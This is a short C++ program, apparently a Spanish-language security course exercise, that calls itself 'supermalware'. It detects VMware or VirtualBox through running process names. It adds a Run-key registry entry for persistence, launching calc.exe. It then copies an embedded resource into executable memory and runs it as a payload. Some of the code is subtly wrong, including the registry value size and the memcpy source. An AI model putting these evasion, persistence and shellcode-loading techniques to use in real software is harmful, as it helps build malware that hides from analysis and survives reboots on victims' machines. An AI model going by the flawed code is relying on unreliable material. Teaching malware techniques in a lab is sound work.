// Actividad3.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

void pregunta1()
{
    HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnapshot == INVALID_HANDLE_VALUE)
    {
        exit(0);
    }

    PROCESSENTRY32 pe32M;
    pe32M.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnapshot, &pe32M))
    {
        exit(0);
    }

    do
    {
        if (lstrcmpW(pe32M.szExeFile, TEXT("vmtoolsd.exe")) == 0 || lstrcmpW(pe32M.szExeFile, TEXT("VBoxService.exe")) == 0)
        {
            printf(" [LOG]: hahah! Maquina virtual detectada!\n");
            break;
        }
    } while (Process32Next(hProcessSnapshot, &pe32M));

    CloseHandle(hProcessSnapshot);

    return;
}


void pregunta2()
{

    printf(" [LOG]: Donde me escondere?\n");

    HKEY key = 0;

    RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &key,
        NULL);

    const char* data = "C:\\Windows\\System32\\calc.exe";

    RegSetValueExA(key, "Supermalware", 0, REG_BINARY, (LPBYTE)data, sizeof(data));
    RegCloseKey(key);

    return;
}


void pregunta3()
{

    printf(" [LOG]: En los recursos encontraras un tesoro\n");


    HRSRC hRes = FindResource(NULL, TEXT("tesoro"), RT_RCDATA);
    if (hRes == NULL)
    {
        exit(0);
    }

    HGLOBAL hResLoad = LoadResource(NULL, hRes);
    if (hResLoad == NULL)
    {
        exit(0);
    }

    DWORD payloadSize = SizeofResource(NULL, hRes);

    void* exec = VirtualAlloc(0, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
    {
        exit(0);
    }

    memcpy(exec, hRes, payloadSize);

    ((void(*)())exec)();

    return;
}

int main()
{
    printf(" [LOG]: Soy un supermalware, esconde tus datos!\n");

    pregunta1();

    pregunta2();

    pregunta3();

    return 0;
}
